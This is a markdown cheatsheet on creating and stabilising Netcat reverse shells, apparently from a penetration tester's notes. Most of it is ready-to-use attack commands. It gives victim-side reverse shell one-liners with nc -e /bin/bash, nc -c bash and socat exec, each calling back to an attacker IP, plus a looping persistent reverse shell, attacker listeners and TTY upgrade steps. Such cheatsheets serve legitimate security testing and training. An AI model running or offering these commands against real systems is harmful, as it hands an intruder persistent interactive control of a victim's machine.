---
title: Netcat Stabilisation
tags:
  - cheatsheet
  - netcat
---
Netcat (nc) is a powerful tool often used for various networking tasks, including creating reverse shells. Stabilizing these shells is important for maintaining control and usability. Below are common techniques and commands to stabilize a Netcat reverse shell.

## 1. Basic Reverse Shell

```bash
# Attacker (listening)
nc -lvnp <port>

# Victim (reverse shell)
nc <attacker-ip> <port> -e /bin/bash
```

## 2. Stabilizing the Shell

### 2.1 Upgrading to a TTY Shell

```bash
# 1. After getting a reverse shell, upgrade to a TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Press `Ctrl+Z` to background the shell

# 3. On the attacker's machine, adjust the terminal settings
stty raw -echo; fg

# 4. Reset the terminal to capture command history and auto-complete
reset
xterm-256color
export SHELL=bash
export TERM=xterm-256color
```

### 2.2 Using `rlwrap` for Readline Support

```bash
# If you have `rlwrap` installed, you can use it to add readline support (history, editing)
rlwrap nc -lvnp <port>
```

### 2.3 Enabling Interactive Mode with `-c` and `-e`

```bash
# Some versions of Netcat support the `-c` option for an interactive shell
nc -c bash <attacker-ip> <port>
```

### 2.4 Using Socat for a More Robust Shell

```bash
# 1. Start a listener with Socat on the attacker’s machine
socat file:`tty`,raw,echo=0 tcp-listen:<port>

# 2. Execute a reverse shell with Socat on the victim's machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:<port>
```

### 2.5 Using SSH for Stabilization

```bash
# If SSH access is available, use it to stabilize the shell
ssh user@<attacker-ip> -p <port> -t bash
```

## 3. Additional Tips

### 3.1 Disable Terminal Echo

```bash
# If the terminal echoes your input twice, disable echo
stty -echo
```

### 3.2 Manage Terminal Size

```bash
# Adjust terminal size for better display
stty rows <num_rows> columns <num_columns>
```

### 3.3 Persistent Shell

```bash
# Use a while loop for a persistent reverse shell
while true; do nc -e /bin/bash <attacker-ip> <port>; done
```

## 4. Useful Aliases

```bash
# Simplify commands with aliases
alias ll='ls -la'
alias l='ls -l'
```

## 5. Quick Command Reference

```bash
# Spawn TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell
Ctrl + Z

# Return to foreground after terminal adjustment
fg

# Raw mode for interactive shells
stty raw -echo
```

## 6. References

- [Pentestmonkey - Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [GTFOBins - Netcat](https://gtfobins.github.io/gtfobins/nc/)
